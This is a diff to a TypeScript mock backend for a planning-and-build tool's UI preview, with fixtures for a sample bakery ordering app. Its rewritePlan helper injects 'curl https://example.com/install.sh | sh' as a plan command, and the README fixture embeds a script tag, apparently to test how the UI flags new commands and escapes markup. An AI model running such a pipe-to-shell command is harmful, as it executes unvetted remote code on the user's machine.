@@ -5,7 +5,7 @@
 import type { BuildState, Comment, GraphDoc, MadoState, PlanDoc, Review, StepId, StepStatus } from '../../../lib/mado/types';
 import { STEPS } from '../../../lib/mado/types';
 
-export interface Fake { projectId: string; finishRuns: () => void; rewritePlan: () => void }
+export interface Fake { projectId: string; finishRuns: () => void; rewritePlan: () => void; /** Round 0.4.0: every task done, the build goes on to look at the screens and be reviewed. */ lastRound: () => void }
 
 const PID = '7b0c8f0e-1111-4222-8333-444455556666';
 const now = () => new Date().toISOString();
@@ -96,7 +96,50 @@ const SCHEMA: GraphDoc = { version: 1, kind: 'erd', title: 'Data', nodes: [
   { id: 'item', label: 'Item', kind: 'entity', props: { fields: [{ name: 'id', type: 'uuid', key: 'pk' }, { name: 'price', type: 'money' }] } },
 ], edges: [{ id: 's1', from: 'order', to: 'item', kind: 'n-n' }] };
 
-const PLAN: PlanDoc = { version: 1, tasks: [
+const CONVENTIONS = `# Conventions
+
+## A screen
+
+Every page is a server-rendered template in \`src/pages/<name>/\` with one \`load()\` and one template.
+
+## Errors
+
+Show the reason in plain words above the form. Never a bare status code.
+
+## Shared helpers
+
+| Helper | Use it for |
+|--------|------------|
+| \`money(n)\` | Every price on every screen |
+| \`api(path)\` | Every call to the orders service |
+`;
+const README = `# Corner Bakery
+
+Order ahead, pick up without queueing.
+
+![A loaf](https://example.com/loaf.png)
+
+## Run it
+
+\`\`\`sh
+npm install
+npm run dev
+\`\`\`
+
+Then open the shop page. The baker's board is at \`/board\`.
+
+<script>alert('never runs')</script>
+
+## الخبّاز
+
+تُغلق الطلبات عند الساعة التاسعة مساءً.
+`;
+
+const PLAN: PlanDoc = { version: 1, verify: ['npm test', 'npx tsc --noEmit', 'npx eslint .'],
+  run: { start: 'npm run dev -- --port 4173', url: 'http://localhost:4173', screens: [{ id: 'shop', path: '/' }, { id: 'basket', path: '/basket' }, { id: 'confirm', path: '/orders/1001' }, { id: 'board', path: '/board' }] },
+  tasks: [
+  { id: 'contracts', title: 'Examples of every answer', description: 'One example file per answer of the orders service.', owns: ['contracts/**'], dependsOn: [], acceptance: ['npm test -- contracts'], feature: 'F2', kind: 'contracts' },
+  { id: 'tests', title: 'Tests of ordering', description: 'The acceptance tests of ordering, written before the feature.', owns: ['tests/orders/**'], dependsOn: ['contracts'], acceptance: ['npm test -- --list'], feature: 'F2', kind: 'tests' },
   { id: 'data', title: 'Database and models', description: 'Tables for items, orders and order lines, with the stock rule.', owns: ['src/db/**', 'migrations/**'], dependsOn: [], acceptance: ['npm run migrate -- --check', 'npm test -- db'], feature: 'F2' },
   { id: 'shop', title: 'Shop page', description: 'Today\'s bakes with photos, prices and what is left.', owns: ['src/pages/shop/**'], dependsOn: ['data'], acceptance: ['npm test -- shop'], feature: 'F1', screens: ['shop'] },
   { id: 'basket', title: 'Basket and ordering', description: 'Basket, pick-up time, name and phone, the 9 pm cut-off.', owns: ['src/pages/basket/**', 'src/orders/**'], dependsOn: ['data'], acceptance: ['npm test -- basket', 'npm test -- orders'], feature: 'F2', screens: ['basket', 'confirm'] },
@@ -106,38 +149,57 @@ const PLAN: PlanDoc = { version: 1, tasks: [
 const TASKS: GraphDoc = { version: 1, kind: 'tasks', title: 'Order of work', nodes: PLAN.tasks.map((t) => ({ id: t.id, label: t.title, kind: 'task' })),
   edges: PLAN.tasks.flatMap((t) => t.dependsOn.map((d) => ({ id: `${d}-${t.id}`, from: d, to: t.id }))) };
 
-function review(blocked: boolean, planHash: string, extraCommand = ''): Review {
+function review(blocked: boolean, planHash: string, extraCommand = '', advice = false): Review {
   return {
     features: [{ id: 'F1', name: "Browse today's bakes", tasks: ['shop'] }, { id: 'F2', name: 'Order for pick-up', tasks: ['data', 'basket'] }, { id: 'F3', name: "The baker's list", tasks: ['board'] }, { id: 'F4', name: 'رسالة تأكيد', tasks: blocked ? [] : ['sms'] }],
     screens: [{ id: 'shop', label: 'Shop', tasks: ['shop'] }, { id: 'basket', label: 'Basket', tasks: ['basket'] }, { id: 'confirm', label: 'Confirmation', tasks: ['basket'] }, { id: 'board', label: "Baker's board", tasks: ['board'] }],
     problems: [
       { kind: 'overlap', message: '“Basket and ordering” and “Confirmation message” both change src/orders. They will be built one after another.', tasks: ['basket', 'sms'] },
+      ...(advice ? [
+        { kind: 'no-contracts' as const, message: 'More than one task, and none writes the examples the parts must agree on.' },
+        { kind: 'no-tests' as const, message: 'No task writes the tests before the feature.' },
+        { kind: 'no-verify' as const, message: 'Nothing is run on the whole project after a round.' },
+        { kind: 'no-run' as const, message: 'The plan does not say how to start the product.' },
+        { kind: 'unchecked-screen' as const, message: 'Nobody will look at “Baker\'s board”: it has no address in the plan.' },
+      ] : []),
       ...(blocked ? [
         { kind: 'cycle' as const, message: '“Shop page” waits for “Baker\'s board”, which waits for “Shop page”. Neither could ever start.', tasks: ['shop', 'board'] },
         { kind: 'untraced-feature' as const, message: 'Nothing in the plan builds F4.' },
       ] : []),
     ],
-    waves: [{ lanes: [{ id: 'w1-a', tasks: ['data'] }] }, { lanes: [{ id: 'w2-a', tasks: ['shop'] }, { id: 'w2-b', tasks: ['basket', 'sms'] }, { id: 'w2-c', tasks: ['board'] }] }],
-    commands: [...new Set(PLAN.tasks.flatMap((t) => t.acceptance)), ...(extraCommand ? [extraCommand] : [])],
+    waves: [{ lanes: [{ id: 'w0-a', tasks: ['contracts', 'tests'] }] }, { lanes: [{ id: 'w1-a', tasks: ['data'] }] }, { lanes: [{ id: 'w2-a', tasks: ['shop'] }, { id: 'w2-b', tasks: ['basket', 'sms'] }, { id: 'w2-c', tasks: ['board'] }] }],
+    commands: [...new Set([...PLAN.tasks.flatMap((t) => t.acceptance), ...(PLAN.verify ?? []), PLAN.run!.start]), ...(extraCommand ? [extraCommand] : [])],
     planHash,
   };
 }
 
 function build(kind: 'idle' | 'building' | 'done'): BuildState {
-  const s = (a: string, b: string, c: string, d: string, e: string) => ({ data: a, shop: b, basket: c, sms: d, board: e }) as Record<string, any>;
+  const s = (a: string, b: string, c: string, d: string, e: string) => ({ contracts: 'done', tests: 'done', data: a, shop: b, basket: c, sms: d, board: e }) as Record<string, any>;
   const st = kind === 'idle' ? null : kind === 'done' ? s('done', 'done', 'done', 'done', 'done') : s('done', 'running', 'failed', 'pending', 'checking');
   const task = (id: string) => ({ id, status: st![id], chatId: st![id] === 'pending' ? undefined : 'build-' + id, commit: st![id] === 'done' ? '4f9c2ab77d01' : undefined, note: st![id] === 'failed' ? 'npm test -- orders: 2 tests failed after the second try.' : undefined });
   return {
     version: 1, status: kind === 'idle' ? 'idle' : kind === 'done' ? 'done' : 'waiting', branch: kind === 'idle' ? '' : 'mado/build-1', base: kind === 'idle' ? '' : 'main',
     startedAt: kind === 'idle' ? undefined : new Date(Date.now() - 42 * 60000).toISOString(),
+    number: 1,
     waves: kind === 'idle' ? [] : [
-      { status: 'done', lanes: [{ id: 'w1-a', status: 'done', tasks: [task('data')] }] },
-      { status: kind === 'done' ? 'done' : 'running', lanes: [{ id: 'w2-a', status: st!.shop, tasks: [task('shop')] }, { id: 'w2-b', status: st!.basket, tasks: [task('basket'), task('sms')] }, { id: 'w2-c', status: st!.board, tasks: [task('board')] }] },
+      { status: 'done', checked: true, verified: true, lanes: [{ id: 'w0-a', status: 'done', tasks: [task('contracts'), task('tests')] }] },
+      { status: 'done', checked: true, verified: true, gateFixChatId: 'build-gatefix', lanes: [{ id: 'w1-a', status: 'done', tasks: [task('data')] }] },
+      { status: kind === 'done' ? 'done' : 'running', ...(kind === 'done' ? { checked: true, verified: true } : {}), lanes: [{ id: 'w2-a', status: st!.shop, tasks: [task('shop')] }, { id: 'w2-b', status: st!.basket, tasks: [task('basket'), task('sms')] }, { id: 'w2-c', status: st!.board, tasks: [task('board')] }] },
     ],
     governor: { maxParallel: 3, running: kind === 'building' ? 2 : 0, holding: kind === 'building', reason: kind === 'building' ? 'Usage is at 84% of this five-hour window.' : undefined },
     plan_hash: 'h1',
   };
 }
+
+const FINDINGS = [
+  { severity: 'must' as const, where: 'src/pages/basket/template.html:41', text: 'The pick-up time list starts at 7:00, but F2 says the shop opens at 6:30 on Fridays.\nThe test only covers a Tuesday.' },
+  { severity: 'should' as const, where: 'src/pages/board/load.ts', text: 'Prices on the board are formatted by hand; the conventions say every price goes through money().' },
+  { severity: 'should' as const, text: 'رسالة التأكيد لا تذكر وقت الاستلام. <b>not markup</b>' },
+];
+const PLANS_EXTRA = [
+  { projectId: 'aaaa1111-2222-4333-8444-555566667777', name: 'مخبز الحي — الطلب المسبق', step: 'spec', stepStatus: 'review', updatedAt: new Date(Date.now() - 3600000).toISOString() },
+  { projectId: 'bbbb1111-2222-4333-8444-555566667777', name: 'A project with a very long name that will not fit in the sidebar at all', step: 'build', stepStatus: 'ready', build: 'waiting', updatedAt: new Date(Date.now() - 7200000).toISOString() },
+];
 
 const text = (file: string, quote: string, heading?: string) => ({ kind: 'text' as const, file, quote, prefix: '', suffix: '', ...(heading ? { heading } : {}) });
 const COMMENTS: Comment[] = [
@@ -156,6 +218,10 @@ function steps(scenario: string): MadoState['steps'] {
     review: ['approved', 'approved', 'approved', 'stale', 'approved', 'ready', 'locked'],
     blocked: ['approved', 'approved', 'approved', 'approved', 'approved', 'ready', 'locked'],
     building: ['approved', 'approved', 'approved', 'approved', 'approved', 'approved', 'ready'],
+    checking: ['approved', 'approved', 'approved', 'approved', 'approved', 'approved', 'ready'],
+    reviewing: ['approved', 'approved', 'approved', 'approved', 'approved', 'approved', 'ready'],
+    reviewed: ['approved', 'approved', 'approved', 'approved', 'approved', 'approved', 'ready'],
+    landed: ['approved', 'approved', 'approved', 'approved', 'approved', 'approved', 'approved'],
     done: ['approved', 'approved', 'approved', 'approved', 'approved', 'approved', 'ready'],
   };
   const list = by[scenario] ?? by.mid;
@@ -182,14 +248,38 @@ export function install(scenario: string): Fake {
     graphs: {} as Record<string, GraphDoc>,
     comments: scenario === 'fresh' || scenario === 'early' ? [] : structuredClone(COMMENTS),
     planHash: 'h1', extraCommand: '',
-    build: build(scenario === 'building' ? 'building' : scenario === 'done' ? 'done' : 'idle'),
+    build: build(scenario === 'building' ? 'building' : ['done', 'checking', 'reviewing', 'reviewed', 'landed'].includes(scenario) ? 'done' : 'idle'),
     chats: {} as Record<string, any>,
+    options: { model: null as string | null, effort: null as string | null },
+    nonce: '', posted: 0,
   };
+  // Round 0.4.0: the phases after the last round.
+  const toReview = (round: number) => {
+    db.build.status = 'reviewing';
+    db.build.review = { status: 'running', round, chatId: 'build-review', findings: [] };
+    mado('build'); mado('state');
+    later(() => {
+      if (round === 1) { db.build.review = { status: 'changes', round: 1, chatId: 'build-review', fixChatId: 'build-reviewfix', findings: structuredClone(FINDINGS) }; mado('build'); later(() => toReview(2)); return; }
+      db.build.review = { status: 'changes', round: 2, chatId: 'build-review', fixChatId: 'build-reviewfix', findings: structuredClone(FINDINGS.slice(1)) };
+      db.build.status = 'done'; mado('build'); mado('state');
+    });
+  };
+  const toChecking = () => {
+    db.build.status = 'checking'; db.build.screens = { status: 'waiting' }; db.nonce = 'n' + Date.now();
+    mado('build'); mado('state');
+    // Nobody looked (a browser cannot): the service gives up by itself.
+    later(() => { if (db.build.status !== 'checking') return; db.nonce = ''; db.build.screens = { status: 'skipped', reason: 'No window of the app looked within two minutes.' }; toReview(1); });
+  };
+  if (scenario === 'checking') { db.build.status = 'checking'; db.build.screens = { status: 'waiting' }; db.nonce = 'n1'; }
+  if (scenario === 'reviewing') { db.build.status = 'reviewing'; db.build.screens = { status: 'done', count: 4, failed: 1 }; db.build.review = { status: 'changes', round: 1, chatId: 'build-review', fixChatId: 'build-reviewfix', findings: structuredClone(FINDINGS) }; }
+  if (scenario === 'reviewed' || scenario === 'landed') { db.build.screens = { status: 'done', count: 4, failed: 0 }; db.build.review = { status: 'changes', round: 2, chatId: 'build-review', fixChatId: 'build-reviewfix', findings: structuredClone(FINDINGS.slice(1)) }; }
+  if (scenario === 'landed') db.build.landedAt = new Date(Date.now() - 20 * 60000).toISOString();
+  const currentStep = () => { let at: StepId = 'brief'; for (const st of STEPS) if (db.steps[st].status !== 'locked') at = st; for (const st of STEPS) if (db.steps[st].status !== 'approved' && db.steps[st].status !== 'locked') { at = st; break; } return at; };
   const reached = (step: StepId) => db.steps[step].status !== 'locked' && db.steps[step].status !== 'ready' && db.steps[step].status !== 'drafting';
   function fill() {
     if (reached('brief')) db.docs.brief = BRIEF;
     if (reached('spec')) { db.docs.spec = SPEC; db.graphs.flow = structuredClone(FLOW); }
-    if (reached('tech')) { db.docs.tech = TECH; db.graphs.architecture = structuredClone(ARCH); db.graphs.schema = structuredClone(SCHEMA); }
+    if (reached('tech')) { db.docs.tech = TECH; db.docs.conventions = CONVENTIONS; db.graphs.architecture = structuredClone(ARCH); db.graphs.schema = structuredClone(SCHEMA); }
     if (reached('design')) db.docs.design = DESIGN;
   }
   fill();
@@ -262,10 +352,33 @@ export function install(scenario: string): Fake {
       if (m[2] === '/stop') c.running = false;
       return json({});
     }
+    if (path === '/api/ai/claude/options') return json({ models: ['opus', 'sonnet', 'haiku'], efforts: ['low', 'medium', 'high', 'xhigh', 'max'], permissionModes: ['acceptEdits', 'plan'] });
+    if (path === '/api/meter/chat') return json({ usage: { count: 0, tokens: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, costUsd: 0 }, chatCostUsd: null, provider: null,
+      plans: { claude: { seenAt: Date.now() / 1000, windows: [{ id: 'five_hour', percent: 62, resetsAt: Date.now() / 1000 + 5400, minutes: 300, status: null, seenAt: Date.now() / 1000, hasReset: false }, { id: 'seven_day', percent: 31, resetsAt: Date.now() / 1000 + 300000, minutes: 10080, status: null, seenAt: Date.now() / 1000, hasReset: false }] }, codex: null } });
+    if (path === '/api/mado' && method === 'GET') {
+      if (!db.exists) return json([]);
+      const at = currentStep();
+      return json([{ projectId: PID, name: 'Corner Bakery', step: at, stepStatus: db.steps[at].status, ...(db.build.status !== 'idle' ? { build: db.build.status } : {}), updatedAt: now() }, ...PLANS_EXTRA]);
+    }
     const base = `/api/mado/${PID}`;
     if (!path.startsWith(base)) return refuse(404, 'Not in the preview');
     const p = path.slice(base.length).split('?')[0];
     if (p === '' && method === 'GET') return json({ project: { id: PID, name: 'Corner Bakery', path: '/Users/you/Projects/corner-bakery' }, exists: db.exists, state: db.exists ? { version: 1, steps: db.steps, plan_hash: db.planHash } : null, files: db.exists ? files() : [] });
+    if (p === '/options') {
+      if (method === 'PUT') { db.options = { model: body?.model || null, effort: body?.effort || null }; }
+      return json(db.options);
+    }
+    if (p === '/build/screens') {
+      if (db.build.status !== 'checking' || !db.nonce) return refuse(409, 'The build is not waiting for anyone to look.');
+      if (method === 'GET') return json({ url: PLAN.run!.url, screens: PLAN.run!.screens, nonce: db.nonce });
+      if (body?.nonce !== db.nonce) return refuse(409, 'Not the request that is open.');
+      db.posted++; db.nonce = '';
+      const results = Array.isArray(body?.results) ? body.results : [];
+      db.build.screens = { status: 'done', count: results.length, failed: results.filter((r: any) => !r.ok).length };
+      toReview(1);
+      return json({});
+    }
+    if (p === '/build/guide') return json({ start: PLAN.run!.start, url: PLAN.run!.url, readme: README });
     if (p === '/start') { db.exists = true; db.steps = steps('early'); mado('state'); return json({}); }
     let x: RegExpExecArray | null;
     if ((x = /^\/doc\/(\w+)$/.exec(p))) {
@@ -307,7 +420,7 @@ export function install(scenario: string): Fake {
       mado('comments');
       return json(r);
     }
-    if (p === '/review') return hasPlan() ? json(review(scenario === 'blocked', db.planHash, db.extraCommand)) : refuse(404, 'No plan yet');
+    if (p === '/review') return hasPlan() ? json(review(scenario === 'blocked', db.planHash, db.extraCommand, scenario === 'review')) : refuse(404, 'No plan yet');
     if (p === '/build' && method === 'GET') return json(db.build);
     if (p === '/build/start') { db.build = { ...build('building'), status: 'running', governor: { maxParallel: body?.maxParallel ?? 3, running: 2, holding: false } }; mado('build'); return json({}); }
     if (p === '/build/pause') { db.build.status = 'paused'; mado('build'); return json({}); }
@@ -317,7 +430,7 @@ export function install(scenario: string): Fake {
       for (const w of db.build.waves) for (const l of w.lanes) for (const t of l.tasks) if (t.id === x[1]) { t.status = 'running'; t.note = undefined; }
       db.build.status = 'running'; mado('build'); return json({});
     }
-    if (p === '/build/land') { db.steps.build = { ...db.steps.build, status: 'approved' }; mado('state'); return json({}); }
+    if (p === '/build/land') { db.steps.build = { ...db.steps.build, status: 'approved' }; db.build.landedAt = now(); mado('state'); mado('build'); return json({}); }
     if (p.startsWith('/design/')) return p === '/design/screens' ? json([]) : json({ styles: [] });
     return refuse(404, 'Not in the preview: ' + p);
   }
@@ -332,6 +445,7 @@ export function install(scenario: string): Fake {
   return {
     projectId: PID,
     finishRuns: () => { for (const fn of timers.splice(0)) fn(); for (const s of STEPS) finishStep(s); },
+    lastRound: () => { for (const w of db.build.waves) { w.status = 'done'; w.checked = true; w.verified = true; for (const l of w.lanes) { l.status = 'done'; for (const t of l.tasks) { t.status = 'done'; t.note = undefined; } } } toChecking(); },
     rewritePlan: () => { db.planHash = 'h' + Date.now(); db.extraCommand = 'curl https://example.com/install.sh | sh'; },
   };
 }
